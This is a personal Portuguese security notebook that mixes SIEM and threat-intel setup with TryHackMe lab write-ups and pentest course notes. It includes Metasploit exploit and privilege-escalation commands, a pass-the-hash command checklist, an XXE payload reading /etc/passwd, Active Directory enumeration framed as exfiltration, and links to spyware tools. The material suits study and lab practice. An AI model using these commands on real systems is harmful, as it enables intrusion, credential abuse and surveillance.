	 <group>sysmon_event1,powershell_execution,</group>
	 </rule>
	</group>

- Ativar logs do windows

Configurando os logs do firewall

Acessa as GPO e vai em Computer -> Windows -> Security -> Defender -> Win Def Firewall Settings
Vai em Logging `Customize` e desmarca `Não configurado`
Salva e sai

Configurando os logs de Instalação

GPO -> Computer -> ADM Templates -> Win Components -> Win Installer -> Logging
Clicar Enable -> logging ON
Salva e sai

Configurando os logs de auditoria

	Auditpol /set /Category:System /failure:enable

- Integrar Wazuh com MISP

Criar o arquivo [Custom-MISP.py](https://gist.githubusercontent.com/OpenSecureCo/65b65be1b2cb170dcea9d6cf09710b38/raw/300fe0736eee196c96cdb0f2ac00bdad3a5f9c6a/custom-misp.py)
Colocar o arquivo em `/var/ossec/integrations`
Trocar a `URL` e a `APY_KEY`

	<integration>
	    <name>custom-misp.py</name>     				<group>sysmon_event1,sysmon_event3,sysmon_event6,sysmon_event7,sysmon_event_15,sysmon_event_22,syscheck</group>
	    <alert_format>json</alert_format>
	</integration>

Adicionar o código acima em `ossec.conf`

	<group name="misp,">
	  <rule id="100620" level="10">
	    <field name="integration">misp</field>
	    <match>misp</match>
	    <description>MISP Events</description>
	    <options>no_full_log</options>
	  </rule>
	  <rule id="100621" level="5">
	    <if_sid>100620</if_sid>
	    <field name="misp.error">\.+</field>
	    <description>MISP - Error connecting to API</description>
	    <options>no_full_log</options>
	    <group>misp_error,</group>
	  </rule>
	  <rule id="100622" level="12">
	    <field name="misp.category">\.+</field>
	    <description>MISP - IoC found in Threat Intel - Category: $(misp.category), Attribute: $(misp.value)</description>
	    <options>no_full_log</options>
	    <group>misp_alert,</group>
	  </rule>
	</group>

Adicionar a regra `misp_rule.xml`

[Reference](https://opensecure.medium.com/wazuh-and-misp-integration-242dfa2f2e19)
[Video](https://www.youtube.com/watch?v=-qRMDxZpnWg)

## OPENCTI

Ferramenta de inteligencia de Cibersegurança

Instalação usando DOCKER e Portainer

	sudo apt-get update
	sudo apt-get install apt-transport-https
	sudo apt-get install ca-certificates
	sudo apt-get install curl
	sudo apt-get install gnupg-agent
	sudo apt-get install software-properties-common
	sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
	sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
	sudo apt-get update
	sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose
	sudo usermod -aG docker $USER
	sudo docker swarm init --advertise-addr 192.168.X.X
	sudo mkdir -p /opt/portainer && cd /opt/portainer
	sudo curl -L https://downloads.portainer.io/portainer-agent-stack.yml -o portainer-agent-stack.yml
	sudo nano ./portainer-agent-stack.yml (Trocar porta de "9000:9000" para "19000:9000" repetir com a "8000")
	sudo docker stack deploy --compose-file=portainer-agent-stack.yml portainer

1. Com o portainer instalado, vamos fazer o deploy do OPENCTI
2. Acessa o site [GitOpenCTI](https://github.com/OpenCTI-Platform/docker) clica `docker-compose.yml` clica RAW e copia tudo
3. Acessar PORTAINER/docker/stacks `add stack` e colar o código
4. Copiar também o `.env.sample` do site acima e colocar o código gerado no site uuidgenerator.net no campo token e editar o restante
5. Colar dentro de `Environment Variable` no Portainer
6. Clicar Deploy e depois acessa IP:8080

[Referência](https://medium.com/@hassaann463/opencti-all-in-one-installation-guide-8a9c159e5b28)

Lista de videos para instalar, configurar e integrar o [OPECTI+MISP+WAZUH](https://www.youtube.com/watch?v=oV_wznNpZ3Y&list=RDCMUC4EUQtTxeC8wGrKRafI6pZg&start_radio=1)

- Adicionar Conector ao OPENCTI

[Connectors for OPENCTI ](https://github.com/OpenCTI-Platform/connectors)

1. Entre no conector desejado (alienvolt) e copia o docker.composer.yml a partir de `connector` tag
2. Acessa o portainer e adiciona a parte copiada em `stack->opencti->editor` e cola acima de VOLUME no final do doc
3. Copiar `depends` on e `opencti` e colar no final do código copiado para "fechar" a tag
4. Copiar a url do OPENCTI acima e colar no alienvault code
5. Copiar o valor da variável do token acima e colar no Alienvault
6. Gerar um novo [UUID](https://www.uuidgenerator.net/) e colar em CONNECTOR ID
7. Gerar a API KEY em [AlienVauktKey](https://otx.alienvault.com/) e colar no código API_KEY
8. E dá um Update the Stack

[Integração: Wazuh e OpenCTI](https://github.com/juaromu/wazuh-opencti)

## MISP

Guia de instalação do MISP

	wget https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.sh
	bash INSTALL.sh -A

Copiar o login e senha que vai aparecer e acessar o IP:443

INTEGRAR MISP+OPENCTI

[Connectors for OPENCTI ](https://github.com/OpenCTI-Platform/connectors)

1. Entre no conector desejado (misp) e copia o docker.composer.yml a partir de `connector` tag
2. Acessa o portainer e adiciona a parte copiada em `stack->opencti->editor` e cola acima de VOLUME no final do doc
3. Copiar `depends` on e `opencti` e colar no final do código copiado para "fechar" a tag
4. Copiar a url do OPENCTI acima e colar no alienvault code
5. Copiar o valor da variável do token acima e colar no Alienvault
6. Gerar um novo [UUID](https://www.uuidgenerator.net/) e colar em CONNECTOR ID
7. Gerar a MISP_KEY no servidor MISP `Admin->ListAuthKeys->AddKey` e colar no código MISP_KEY
8. Ir em `EventAction` e `AddTag` para adicionar uma nova tag e nomeie opencti:import
9. Depois acessar um evento e adicionar a tag criada acima
10. E informar a tag em IMPORT_TAG na stack
11. E dá um Update the Stack


Instalação usando DOCKER de forma MANUAL (Não funcionou)

	sudo apt install docker-compose
	mkdir opencti && cd opencti
	git clone https://github.com/OpenCTI-Platform/docker.git
	cd docker
	sudo sysctl -w vm.max_map_count=1048575
	sudo echo "vm.max_map_count=1048575" >> /etc/sysctl.conf
	mv .env.sample .env
	sudo systemctl start docker.service
	sudo docker-compose up -d

Instalação MANUAL (Não funcionou)

	mkdir /opencti && cd /opencti
	wget <https://github.com/OpenCTI-Platform/opencti/releases/download/{RELEASE_VERSION}/opencti-release-{RELEASE_VERSION}.tar.gz>
	tar xvfz opencti-release-{RELEASE_VERSION}.tar.gz
	cd opencti
	cp config/default.json config/production.json [alterar TOKEN copiado de https://www.uuidgenerator.net/]
	cd src/python
	pip3 install -r requirements.txt
	cd ../..
	sudo apt remove nodejs
	curl -sL https://deb.nodesource.com/setup_14.x | sudo bash -
	sudo apt update
	sudo apt install nodejs [V.14]
	curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
	echo "deb https://dl.yarnpkg.com/debian/ stable main" | sudo tee /etc/apt/sources.list.d/yarn.list
	sudo apt install yarn
	yarn install
	yarn build
	yarn serv
	cd worker
	pip3 install -r requirements.txt
	cp config.yml.sample config.yml
	python3 worker.py &

## DVWA install

Fazer o deploy do DVWA em uma maquina virtual [DVWA Official](https://github.com/digininja/DVWA?tab=readme-ov-file)

Fazer a istalação de uma maquina virtua (preferencialmente Debian Based)

	sudo apt update && sudo apt upgrade -y
	sudo git clone https://github.com/digininja/DVWA.git
	wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
	sudo chmod +x Install-DVWA.sh
	sudo su
	./Install-DVWA.sh

Acessar via web a aplicação IP/DVWA
Login: admin
Senha: password

## BUG BOUNTY

Dicas, ferramentas, cursos serão adicionados aqui no intuito de melhorar o processo de reconhecimento e sucesso na exploração.

- Ferramentas:

[NUCLEI](https://www.hashthecode.com/post/nuclei)

[MAGICRECON](https://github.com/robotshell/magicRecon)

- Cursos:

[OFJAAAH](https://ofjaaah.com.br/site)

- Plataformas

[BUGHUNT](https://admin.bughunt.com.br/login)

[HACKERONE](https://hackerone.com/opportunities/all)

[HACKAFLAG](https://hackaflag.com.br/)

## COMANDOS ALEATORIOS

	Ctrl + Z | echo "LIBERA O TERMINAL"
	Jobs | echo "LISTA OS JOBS"
	bg %1 | echo "COLOCA O JOB EM BACKGROUND"
	disown -h %1 | echo "GARANTE QUE O JOB NAO SERÁ ENCERRADO APÓS FECHAR O SSH"
	ALTERNATIVA
	screen -S SessaoName | echo "Cria uma Sessao"
	Ctrl + A depois D | echo "Sai da sessão criada"
	screen -ls | echo "lista as sessões ativas"
	screen -r SessaoName | echo "reconecta à sessão"
	screen -S SessaoNome -X quit | echo "Mata a sessao informada"
	

## FERRAMENTAS ALEATÓRIAS

[Aplicativo Movel vulnerável para testes labs](https://github.com/satishpatnayak/AndroGoat)

[Payloads Diversos](https://github.com/swisskyrepo/PayloadsAllTheThings)

[SOCIAL ANALYZER](https://github.com/qeeqbox/social-analyzer.git)

Ferramenta que faz buscas e várias midias sociais

[THE SPY's JOB](https://github.com/XDeadHackerX/The_spy_job.git)

Ferramenta para localizar telefone

[Site para pesquisar o DNS Reverse reverso nslookup colocando o IP](https://www.cutestat.com)

    cat url.txt | hakrawler

Ferramenta crawling web que faz uma busca avaçada por hrefs e outros termos interessantes

Ferramenta de análise de tráfego de rede que ta entrando e saindo `NETWORK MINER`, baixa seleciona a placa de rede e aparecerá todo tráfego

Ferramenta de [Espionagem](https://www.hispy.io/) paga HISPY 

Ferramenta para verificar onde a sua conta está associada: [SAYMINE](https://www.saymine.com) 

Ferramenta gratuita para Web Application Firewall WAF `MODSECURITY`

Ferramenta para análise de código e informar vulnerabilidades dentro das pastas do código fonte `horusec.io`

Ferramenta para testar a segurança de imagens de containers `trivy` `trivy fs . > imagem-docker` `trivy image python:3.4-alpine`

Ferramenta GREP com a mensagem: "grep: (standard input): binary file matches" usa se `grep -a 'word'`

Ferramenta para conectar a um banco de dados oracle de forma externa `sqlplus <username>/<password>@<IP_ADDRESS>:<PORT>/<SERVICE_NAME>` caso ao executar o comando apresente erro de diretório, rode `sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

Ferramenta ZERO TRUST para até 5 users free `Twingate`

Ferramenta para criar arquivo zip com senha `zip -re FileNameZipped.ZIP files-to-zip*`

Ferramenta para criar uma senha unica `/usr/bin/dbus-uuidgen`

Ferramenta de "VPN" via SSH simulando um Proxy `ssh -D 1337 -C -q -N root@server` depois `Chromium --no-sandbox --proxy-server="socks5://localhost:1337"`

Ferramenta abrir chromium para ignorar certificado mensagem no navegador browser `chromium --ignore-certificate-errors http://urls.tested.com`

Ferramenta para coleta de grande volumes de dados como dados de rede, logs, portas, http. Ferramenta bem generalziada de monitoramento de ativos com métricas avançadas e path de gargalo `SPLUNK`

Ferramenta que faz a coleta dos dados dos agentes e centraliza para enviar para a ferramenta de observabilidade, `OpenTelemetry` tipo de arquivo `.OTLP`

Ferramenta que funciona como um SAST e DAST desde o desenvolvimento até o deploy da aplicação, tem a parte de learning, free da ferramenta `snyk`

Ferramenta para analise de token JWT [JWT Pentest](https://github.com/ticofookfook/JWT_PENTEST/tree/main)

Ferramenta WAYBACKLISTER ferramenta de fuzzing e crowling de dominios [BACKLISTER](https://github.com/anmolksachan/wayBackLister.git)

Ferramenta para testar conexões SIP com um host `sipp -sn uac 177.190.244.90:5060 -t t1 -p 443` -t u1 (PARA UDP) -p (porta de origem)

## SOURCES RECURSOS LINKS

LFI source list WINDOWS (LFI list Windows)[https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows]

LFI source list LINUX (LFI list Linux)[https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux] 

Site para download de Wordlists 'dicionario', WL indicada `dicassassin` [WeakPass](https://weakpass.com/wordlist/big)

## VPN forward to Host

To access the network of the VPN connected to your guest Windows machine from your host Kali machine, you'll need to set up routing and potentially enable IP forwarding on the Windows guest. Here's a general guideline to achieve this:

1. **IP Forwarding on Windows Guest:**

   First, make sure your guest Windows machine is set up to allow IP forwarding. This will allow the Windows machine to forward packets from the VPN network to the host machine.

   - Open the Windows Registry Editor (regedit).
   - Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`.
   - Find or create a DWORD value named `IPEnableRouter` and set its value to `1`.
   - Restart the Windows machine.

2. **Routing Configuration on Windows Guest:**

   Next, you'll need to set up specific routes on your Windows guest so that traffic destined for the VPN network is properly forwarded to the host machine.

   - Open a Command Prompt with administrative privileges on the Windows guest.
   - Use the `route` command to add a route that directs traffic to the VPN network (replace `VPN_NETWORK` with the actual VPN network's IP range and subnet mask, and `GUEST_VPN_GATEWAY` with the Windows guest's VPN gateway IP address):
   
     ```
     route -p ADD VPN_NETWORK MASK VPN_SUBNET_MASK GUEST_VPN_GATEWAY METRIC 10
     ```
   
   - The `-p` flag makes the route persistent across reboots.

3. **Network Configuration on Kali Host:**

   On your Kali host, you need to configure routing so that it knows how to reach the VPN network through the Windows guest.

   - Open a terminal on your Kali host.
   - Use the `route` command to add a route that directs traffic to the VPN network through the Windows guest's IP address (replace `GUEST_IP` with the actual IP address of the Windows guest on your Kali host's network):
   
     ```
     sudo route add VPN_NETWORK MASK VPN_SUBNET_MASK GUEST_IP
     ```
   
   - This should instruct your Kali machine to send traffic destined for the VPN network through the Windows guest.

Remember to replace placeholders like `VPN_NETWORK`, `VPN_SUBNET_MASK`, `GUEST_VPN_GATEWAY`, and `GUEST_IP` with the actual values from your network setup.

Please note that the specific steps might vary depending on your network configuration, versions of operating systems, and other factors. Also, keep in mind that altering network settings can have security implications. Always ensure you understand the changes you're making and how they might impact your network's security.

## Travis DeForge Vuln Recommendations

"Older Cisco Catalyst switches which are still used in large quantities had a service on port 4786 called Cisco Smart Install. It let you push configurations to the switches to administrator them. Kinda like SNMP but the difference is there was never any authentication, So you can use an open source tool called `Siet.py` (on github) to spin up a TFTP server and pull the configuration of that switch. Including administrator passwords. Without authentication"

"Here's another one like that. Port `UDP 623 IPMIv2`, do you know that one? You'll see IPMIv2 on virtualization hosts, usually `Dell IDRAC or HP iLOs`. It is a terribly flawed protocol. Basically when you tell it a username it will respond with the hashed password of that user. So you can just dump them immediately.  
I imagine it like this, You walk up to a secret club and the bouncer asks "what's your name" so you say "admin" and he goes "okay so your password is Rosepetal right" and you say "yes". Then he let's you in. It's a comically stupid protocol. There is a Metasploit module to exploit it wicked easily "


## LABS THM
Lessons learned from THM

A exploração teve início com a identificação de uma vulnerabilidade de Execução Remota de Código (RCE) no CMS SPIP, explorada através de um script público disponível no GitHub. Essa falha permitiu a obtenção de um shell inicial com permissões do usuário www-data, proporcionando o primeiro acesso ao sistema.

Durante a fase de pós-exploração, foi descoberta uma chave SSH privada pertencente ao usuário thinker, armazenada em seu diretório pessoal. Essa chave, indevidamente acessível, possibilitou uma conexão SSH autenticada, elevando o acesso para o usuário thinker de forma direta e eficiente.

A etapa final de escalação de privilégios envolveu a identificação de um binário SUID chamado /usr/sbin/run_container, que executava um script em /opt/run_container.sh com permissões elevadas. Através da análise com o comando strings, foi possível identificar o carregador dinâmico /lib64/ld-linux-x86-64.so.2, que foi utilizado para obter um shell mais estável. A manipulação do script run_container.sh, adicionando o comando bash -p, resultou na execução de um shell com privilégios de root, completando com sucesso a exploração e permitindo a captura da flag final.
[POC EXPL 2023](https://github.com/Chocapikk/CVE-2023-27372/blob/main/CVE-2023-27372.py)

#BACKTRACK
Desafio Completo no TryHackMe: Do LFI ao Root! (BACKTRACK)

O desafio começou com uma exploração de Local File Inclusion (LFI), revelando credenciais que me permitiram acessar o painel do Tomcat. Através de uma vulnerabilidade de file upload, consegui implantar uma shell reversa via CURL e obter acesso inicial ao sistema.

A primeira escalação de privilégios foi realizada explorando um ansible-playbook mal configurado, que me concedeu acesso como um usuário com maiores permissões. Em seguida, utilizei tunelamento SSH para redirecionar uma porta interna, expondo uma aplicação web vulnerável. Essa aplicação continha uma nova falha de file upload(../../file.php.png), que explorei para ganhar acesso como outro usuário privilegiado. A etapa final envolveu injeção de processos em um serviço rodando como root, consolidando meu acesso completo ao sistema.

[Ref](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
[Ref](https://www.errno.fr/TTYPushback.html)

Exploit WebMin

	exploit/linux/http/webmin_backdoor

Exploit para TOMCAT lab (TOMGHOST)

 	admin/http/tomcat_ghostcat

Quebra de chave GPG e leitura de arquivo encriptado: Com a chave tryhackme.asc e o arquivo credential.pgp fizemos o seguinte, com o `gpg2john tryhackme.asc` pegamos a chave .asc e com a chave jogamos no `john` e quebramos encontrando a senha, então importamos o arquivo `gpg --import tryhackme.asc` e colocamos a senha quebrada, e ao dar um cat no `credential.pgp` colocamos a senha e tivemos acesso ao arquivo encriptado.

Stegonografia

Ferramentas: `Exiftool` - `stegcracker` - `binwalk` - `steghide extrackt -sf picture.png -p password`

	steghide --info img.jpeg -p pass
 	steghide extract -sf img.jpeg -p pass

[Ferramenta Online](https://www.aperisolve.com)
[Procura imagem na internet](https://tineye.com/)

Postexploitation

While with meterpreter session, run the post exploitation for privesc

	run post/multi/recon/local_exploit_suggester
 
 After run the exploit with the current session, run the command above: Firts to list NT System process, second to use the process to get privesc

	ps
	migrate -n spoolsv.exe

If RDP are not available on the machine, we can use the post exploit to enable it and open RDP

	run post/windows/manage/enable_rdp

Lab OwaspTop10

	Comandos para SQLITE3
 	sqlite3 filename.db
  	.tables
   	SELECT * FROM table-name;
    	Importante olhar na pasta assets para encontrar os arquivos.db

XML payloads for testing on input fields

	<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 	<userInfo>
  	<firstName>falcon</firstName>
  	<lastName>&name;</lastName>
 	</userInfo>

.

	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	<root>&read;</root>


## SETTING RDP with Xfce on KALI

Now run the following

	wget https://gitlab.com/kalilinux/recipes/kali-scripts/-/raw/main/xfce4.sh
	chmod +x xfce4.sh
	sudo ./xfce4.sh
	sudo systemctl enable xrdp --now
	sudo /etc/init.d/xrdp start

[Another TUTO - XRDP no Kali ](https://blog.eldernode.com/kali-linux-xrdp-not-working/)

## Pass The Hash

Checklist:

	pth-winexe
	psexec from metasploit
	evil-winrm -i 127.0.0.1 -u user -H hashe-here
	impacket-atexec -hashes 'hash-here' user@127.0.0.1 command(optionally)
	impacket-wmiexec -hashes 'hashe-here' user@127.0.0.1
	python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20
	python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
	python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
	python smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
	pth-smbclient -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20/c$
	crackmapexec smb 192.168.1.20 -u user1 -H 3d278165f6d949465b60d71d42ae7ded -x whoami
	pth-wmic -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20 “select Name from Win32_UserAccount”
	python rpcdump.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
	pth-rpcclient -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20
	python atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20 whoami

[References from above](https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491)
 
PassTheHash [Examples]([url](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
 
Explorar o ativo inserindo um atalho no compartilhamento [LinkBOMB](https://github.com/dievus/lnkbomb) 

Ferramenta de descoberta de ativos de rede de forma rápida e simples `netdiscover -r 10.10.10.0/24` 
Mostra MAC - Brand - IP | Semelhante ao Advanced IP Scanner pra Windows

Script abaixo serve para listar os IPs de uma subnet - util para fazer bruteforce com ferramentar que nao aceitam passar a rede/mascara

	import sys
	import ipaddress
	
	def calculate_ip_addresses(network_input):
	    try:
	        # Parse the input and create an IPv4Network object
	        network = ipaddress.IPv4Network(network_input, strict=False)
	        
	        # List all IP addresses within the network
	        ip_addresses = list(network.hosts())
	
	        # Return the list of IP addresses
	        return ip_addresses
	    except ValueError as e:
	        return "Invalid input. Please provide a valid CIDR notation (e.g., 10.1.1.0/24)."
	    except ipaddress.NetmaskValueError as e:
	        return "Invalid subnet mask. Please provide a valid CIDR notation (e.g., 10.1.1.0/24)."
	
	if __name__ == "__main__":
	    if len(sys.argv) != 2:
	        print("Usage: python script_name.py <network>")
	        sys.exit(1)
	
	    network_input = sys.argv[1]
	    result = calculate_ip_addresses(network_input)
	
	    if isinstance(result, str):
	        print(result)
	    else:
	        for ip in result:
	            print(ip)

## WIFI Hacking
Curso de WifiHacking

Criptografia SIMETRICA

	openssl enc -aes256 -a -e -k chavesenha -in arquivo.file -out arquivo-enc.file

Cria um arquivo encriptado usando uma senha

	openssl aes-256-cbc -d -a -k chavesenha -in arquivo-enc.file -out arquivo-dec.file
 	openssl enc -d -aes-256-cbc -in arquivo_encriptado -out arquivo_descriptado -k SUA_PALAVRA

Desencripta o arquivo gerado anteriormente, trazendo-o para seu estado origina

	/usr/bin/dbus-uuidgen

Usando para gerar chave aleatória e usar em criação de chaves

Criptografia ASSIMETRICA

	openssl genrsa -out private.pem 2048

Gerar uma chave privada de 2048

	openssl rsa -in private.pem -outform PEM -pubout -out public.pem

Gera a chave publica a partir da chave privada gerada anteriormente

	openssl rsautl -in arquivo.file -out arquivo-enc.rsa -encrypt -pubin -inkey public.pem

Gera o arquivo encriptado

	openssl rsautl -in arquivo-enc.rsa -out arquivo-dec.file -decrypt -inkey private.pem

Decripta o arquivo usando a chave privada

## SMART PENTEST OSINT

Ferramentas para o parsing

	subfinder
	sublist3t
	asserfinder
	openrdap `~/go/bin/rdap google.com --json >> file.json`
	nmap
	masscan
	nuclei
 
Modulo 3 Ambiente Docker

	sudo apt update
	sudo apt upgrade
	sudo apt-get install docker.io
	sudo apt-get install docker-compose
	service docker status
 
Comando utilizados para atulalizar o linux e instalar o docker
 
 	screen -S nomedatela
  
Cria uma tela com o nome nomedatela

	screen -list
 
Lista as telas existentes

	screen -x nomedatela
 
Utiliza a tela mencionada

 	hub.docker.com
  
Hub de imagens docker

	docker pull image-name
 
Faz o download da imagem docker passada

	docker images
 
Lista as imagens docker
 
	docker run -it ubuntu bash
 
Roda a imagem ubuntu no modod interativo (ao sair a umagem continua rodando)

	docker ps
 
Lista os dockers rodando

 	docker run -it --name docker01 ubuntu:latest bash
  
Roda a iamgem ubuntu com o nome docker01 e no modo interativo
  
	docker ps -a
 
Lista as imagens docker rodando em segundo plano

	docker stop id-docker
 
Para a imagem docker passada

	docker rm id-docker
 
Remove a imagem docker do segundo plano

	docker run -it --rm --name docker01 ubuntu:latest bash
 
Roda a imagem docker no modo insterativo (Remove a imagem ao sair do terminal)

	docker run -it --rm --name docker01 -v '/docker/docker-share:/tmp/local-share' ubuntu bash
 
Roda a imagem docker no modo interativo executa um mapeamento da pasta do docker no /tmp/ (deleta tudo ao sair da interação)

	docker run -it --rm --name docker01 -p "9000:90" ubuntu bash
 
Roda a imagem docker no modo interativo executa um mapeamento da porta 80 do docker para a porta 9000 da maquina hospedeira (deleta tudo ao sair da interação)

	docker run -it --rm --name docker01 ubuntu bash
 
Ao rodar o comando acima, instala as ferramentas normalmente para fazer o commit para uma nova imagem (comando abaixo, sem fechar o bash)

	docker commit id-container new-image-name
 
Faz o commit de uma nova imagem com as ferramentas instaladas

	docker run --name docker_nmap new-image-name nmap ip-
 
 Ao rodar esse comando é iniciado o docker que foi commitado anteriormente e executa o nmap e traz a saída no terminal e a imagem é destruida.

	FROM kalilinux/kali-rolling:latest
	
	WORKDIR /data
	WORKDIR /scripts
	
	RUN apt-get update
	
	RUN apt-get install nmap -y


Os comandos acima é inserido dentro do `Dockerfile` que será utilizado para fazer a build de uma imagem automaticamente e salvar para ser utilizada

	docker image build -t image-name-from-dockerfile:tag-name .

O comando acima monta a imagem de acordo com o que ta descrito no dockerfile dentro do diretório atual, e deixa pronta para usar

	docker --rm image-name-from-dockerfile:tag-name nmap ip-address -sSV

 O comando acima roda a imagem criada pelo dockerfile e roda o comando passado e traz o output

	 version: '3'
	services:
	  apache:
	    image: bitnami/apache:latest
     	    container_name: docker_apache_teste
	    volumes:
	      - ./data:/data
	    ports:
	      - 80:8080
	      - 443:8443

As linhas acima devem estar no arquivo chamado `docker-compose.yaml` que servem para baixar e deixar pronta uma imagem docker, com a diferença que o docker compose permanece rodando

	docker-compose -f docker-compose.yaml up -d

O comando ler o arquivo do doker compose baixa a imagem, e deixa pronta para utilizar. O -d serve para manter em segundo plano.

	docker exec -it docker-name bash

Para se conectar no docker em execução em entrar no modo interativo, `exit` para sair sem derrubar 

	docker-compose down

O comando acima para a imagem que estava em execução em docker compose, mas precisa ser no diretório do docker

Preparando o ambiente

	LOCAL mkdir data-es | chmod 777 data-es 
	LOCAL wget https://github.com/DesecSecurityGit/Smart-Recon/blob/main/Modulo4/docker-compose.yml
	LOCAL sysctl -w vm.max_map_count=262144
	LOCAL docker-compose up
	LOCAL curl -XGET https://localhost:9200 -u 'admin:admin' --insecure
	   LOCAL mkdir tls | cd tls | nano certs.sh
	   LOCAL chmod +x certs.sh | ./certs.sh
	   LOCAL chmod 777 root-ca.pem admin-key.pem admin.pem
	   LOCAL docker-compose up
	   LOCAL docker exec -it d40dbcc5f7a4
	   CONTAINER vi /usr/share/elasticsearch/plugins/opendistro_security/securityconfig/internal_users.yml
	   LOCAL nano internal_users.yml
	   CONTAINER sh /usr/share/elasticsearch/plugins/opendistro_security/tools/hash.sh
	LOCAL docker-compose -f docker-compose_completo.yml up
	
[certs.sh](https://github.com/DesecSecurityGit/Smart-Recon/blob/main/Modulo4/certs.sh)

[docker-compose_completo.yml](https://github.com/DesecSecurityGit/Smart-Recon/blob/main/Modulo4/docker-compose_completo.yml)

NOTES: 	Se receber um código 137 "exited with code 137" adiciona mais RAM à máquina.
	Se receber um código 78 "exited with code 78" é preciso rodar o comando `sysctl -w vm.max_map_count=262144`, podendo, para não precisar rodar novamente o comando, adicionar o `vm.max_map_count=262144` e o `vm.swappiness=10` e o `vm.vfs_cache_pressure=50` na ultima linha do /etc/sysctl.conf para melhorar o Swap e o Cache também.
	Para nao ter problemas com a quantidade de indies criados roda o comando: `curl -XPUT --insecure --user admin:'unkqwer' https://localhost:9200/_cluster/settings -H "Content-Type: application/json" -d '{ "persistent": { "cluster.max_shards_per_node": "5000" } }'`

Construindo a Automação

	cat script.sh | parallel -u
Executa o script.sh em paralelo, dessa forma, sendo mais performático a sua execução.

	...

## NOMENCLATURAS

**Browser fingerprint** - Its the technic websites get informations abou your browser, gpu, resolution, plugins, time
**Forced browsing** - is the way you test some directories or files or ids and others on web browser manually
**CSRF** - is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
**SSRF** - is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location [TOOL](https://github.com/R0X4R/ssrf-tool)
**Code Injection** - is the action to inject code in a specific part of the page, making it run
**Image upload** - Insert a peace of code in an image to run on the server
**Overpass The Hash** - The Overpass The Hash/Pass The Key (PTK) attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network

## Curso Web Hacking CADU CROWSEC

`Type Juggling` Vulnerabilidade de burlar o formulário de login, no browser copiando a requisição como Fetch e inserindo no Console alterando o login ou senha como true ou false e ver o comportamento da requisição.

`Arquivo de sessão PHP` Olhar em /var/lib/php/sessions/ os arquivos de sessão e analisar, podem haver informações importantes

Eu posso fazer alguns testes na URL, `login.php?success=true` | forçar o usuário passando `login.php?username=admin` | HTML injection `register?msg=Registrado com Sucesso!` pode-se injetar um código HTML `<h1>hacked<h1>` e aparecer na tela de cadastro, ou ate mesmo um XSS.

## PÓS GRADUAÇÃO
Relatos de tarefas e anotações das matérias da Pós Graduação

## SSI
    
Laboratório prático do SSI

      adfind.exe -f "objectcategory=person" > ad_users.txt
 
 Find users from Active Directory and save on a file
  
      net user /domain > ad_users_net.txt
      adfind.exe -f "objectcategory=computer" > ad_computers.txt
      net group "Domain Computers" /domain > ad_computers_net.txt
      adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
      net group /domain > ad_goup_net.txt

Comandos para exfiltração de dados da maquina alvo

- OCS - Bruno Botelho

Material da Disciplina [Pós OC](https://ygoralberto.github.io/FILES/Po%CC%81s%20OC.pdf)

1. ARP Spoofing
   
   - Definição: Consiste no ataque onde você consegue fazer um ataque de MAC, onde o atacante finge ser o roteador e a maquina alvo pensa que o roteador é a maquina do atacante.
   - Objetivo: Monitorar todas as conexões que a maquina alvo está fazendo, por exemplo FTP, HTTP, onde passam em texto claro.
   - Cenário: Estar presente na rede
   - Mitigar: Implemnetar mecanismos de defesa como: Switch e firewalls e monitoramento em geral.

2. ICMP Tunneling
   
   - Definição: Modificar o pacote ICMP, burlando o request e o reply.
   - Objetivo: Rodar comandos remotos e fazer exfiltração de dados.
   - Cenário: Acesso à maquina alvo e inserir o arquivo para fazer a comunicação.
   - Mitigar: Monitorar as requisições, comportamento, tempo de requisição, tamanho do pacote, o pacote em si.

3. DNS Tunneling
   
   - Definição: Consiste em fazer com que a maquina alvo faça consultas DNS em um servidor atacante, essa comunicação vai retornar um C2 na maquina, permitindo rodar comandos remotamente.
   - Objetivo: Rodar comandos remotamente no alvo (caso o mesmo não saia para a internet, pode-se utilizar o servidor de DNS interno)
